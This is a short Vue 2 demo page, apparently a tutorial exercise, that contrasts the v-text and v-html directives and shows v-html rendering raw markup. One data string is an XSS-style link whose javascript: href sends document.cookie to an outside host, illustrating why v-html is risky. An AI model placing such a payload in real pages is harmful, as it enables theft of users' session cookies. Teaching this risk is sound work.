<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!-- 容器 -->
    <div id="root">
        <div>你好，{{name}}</div><br>
        <div v-text="str"></div>
        <div v-html="str"></div>
        <div v-html="str2"></div>

    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm=new Vue({
        el:'#root',
        data:{
            name:'于适',
            str:'<h3>谷江山</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>click me!</a>'
        }
    })
</script>
</html>
